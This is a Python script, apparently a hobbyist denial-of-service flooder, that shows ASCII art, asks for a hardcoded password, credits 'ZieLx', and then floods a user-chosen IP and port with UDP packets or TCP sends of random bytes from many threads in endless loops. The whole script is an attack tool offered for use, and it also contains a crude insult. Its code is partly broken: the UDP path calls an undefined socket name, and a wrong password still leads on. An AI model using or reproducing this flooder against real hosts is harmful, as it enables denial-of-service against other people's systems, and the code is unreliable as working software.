import random
import socket
import time
import threading
import os , sys , codecs

os.system("clear")
print(""""\033[95m──────────────────▒
─────────────────░█
────────────────███
───────────────██ღ█
──────────────██ღ▒█──────▒█
─────────────██ღ░▒█───────██
─────────────█ღ░░ღ█──────█ღ▒█
────────────█▒ღ░▒ღ░█───██░ღღ█
───────────░█ღ▒░░▒ღ░████ღღღ█
───░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
───▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
───██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
───██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
──██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
──█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
─██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
─█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
██ღღ▒████████████ღღ████████████░ღ█▒
█░ღღ████████████████████████████ღღ█
█▒ღ██████████████████████████████ღ█
██ღღ████████████████████████████ღ██
─██ღღ██████████████████████████ღ██
──░██ღღ██████████████████████ღღ██
────▓██ღ▒██████████████████▒ღ██
───░──░███ღ▒████████████▒ღ███
────░░───▒██ღღ████████▒ღ██
───────────▒██ღ██████ღ██
─────────────██ღ████ღ█
───────────────█ღ██ღ█
────────────────█ღღ█
────────────────█ღ█░
─────────────────██░""")

password ="love"

for i in range(3):
	pwd = input("\033[97m[•] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[97m[•] Correct...")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] Wrong Password : ")
		continue
time.sleep(5)
print("\033[97m[•] Login \033[92mAuthorized!!! ")
time.sleep(5)
os.system("clear")
print("\033[91m▓█████▄ ▓█████▄  ▒█████    ██████ ") 
print("\033[91m▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ ") 
print("\033[91m░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ") 
print("\033[91m░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒ ") 
print("\033[91m░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒ ") 
print("\033[31m ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ") 
print("\033[31m ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░ ") 
print("\033[21m ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  ") 
print("\033[21m   ░       ░        ░ ░        ░  ") 
print("\033[21m ░       ░                        ") 
print("""\033[97m======================================
\033[91m<\> Code : ZieLx
\033[91m<\> Join King Community
<\> Anak Kontol Mau Rename
\033[97m======================================""")

ip =str(input("\033[96m<\> Ip Target :\033[91m "))
port =int(input("\033[96m<\> Port Target : \033[91m"))
times =int(input("\033[96m<\> Times :\033[91m "))
size =int(input("\033[96m<\> Size :\033[91m "))
choice =str(input("\033[96m<\> Ready? (y/n) :\033[91m "))

def run():
	size = os.urandom(1025)
	i = random.choice(("[•]","[+]","[$]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr =(str(ip),int(port))
			for x in range(times):
				sock.sendto(size,addr)
				print(i +" \033[31m%s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
		except:
					print("\033[31m[•] %s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
					
def run2():
	size = os.urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(size)
			for x in range(times):
				s.send(size)
			print(i +" \033[31m%s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
		except:
			s.close()
			print("\033[31m[•] %s:%s \033[96m Has Been Timed Out!!!"%(ip,port))
					
for y in range(size):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
			